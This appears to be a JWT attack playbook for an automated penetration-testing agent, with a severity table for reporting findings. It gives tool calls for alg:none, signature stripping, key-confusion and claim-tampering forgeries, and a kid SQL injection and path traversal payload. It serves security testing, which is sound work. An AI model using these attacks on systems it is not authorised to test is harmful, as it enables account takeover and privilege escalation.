# JWT Attack Methodology

## Reconnaissance

1. Intercept traffic and identify JWT tokens (Base64 with two dots: `xxxxx.yyyyy.zzzzz`)
2. Decode header to determine algorithm: `alg` field
3. Decode payload to identify claims: `sub`, `role`, `exp`, `iss`

Use `caido_httpql_search(query="resp.header.name:authorization")` to find JWT usage.

## Attack Sequence — Try in Order

### Attack 1: Algorithm None

Change the header `alg` to `none` and remove the signature:
```
exploit_jwt(token="<captured_jwt>", attack="alg_none")
```

If the server accepts it, any claim can be forged. **Critical vulnerability.**

### Attack 2: Signature Stripping

Remove the signature entirely (everything after the second dot):
```
exploit_jwt(token="<captured_jwt>", attack="strip_signature")
```

Some implementations only validate signature when present.

### Attack 3: Algorithm Confusion (RS256 → HS256)

If the server uses RS256 (asymmetric), try signing with HS256 using the **public key** as the HMAC secret:
```
exploit_jwt(token="<captured_jwt>", attack="hmac_confusion", public_key="<server_public_key>")
```

This works when the server uses the same key variable for both RSA verification and HMAC verification.

### Attack 4: Claim Tampering

Modify claims in the payload to escalate privileges:
```
exploit_jwt(
    token="<captured_jwt>",
    attack="claim_tamper",
    claims='{"role": "admin", "sub": "victim_user_id"}'
)
```

Test with each attack method to find one that validates.

### Attack 5: Expired Token Reuse

Try using an expired token — some servers don't check `exp`:
```
exploit_jwt(token="<expired_jwt>", attack="claim_tamper", claims='{}')
```

### Attack 6: Key ID (kid) Injection

If the JWT header has a `kid` field, try:
- SQL injection: `kid: "' UNION SELECT 'secret' --"`
- Path traversal: `kid: "../../dev/null"`
- Known key: `kid: "public_key_id"`

## Decision Tree

```
JWT found in traffic?
├── Decode header → check alg
│   ├── RS256 → Try alg:none, then HS256 confusion
│   ├── HS256 → Try alg:none, then brute-force weak keys
│   └── none already → Already vulnerable!
├── Check exp claim
│   └── Expired? → Try replaying anyway
└── Check role/admin claims
    └── Present? → Try claim tampering with each attack
```

## Reporting

| Attack | Severity |
|--------|----------|
| alg:none accepted | CRITICAL |
| RS256→HS256 confusion | CRITICAL |
| Signature not validated | CRITICAL |
| Expired tokens accepted | HIGH |
| Claim tampering (with valid sig) | Depends on impact |
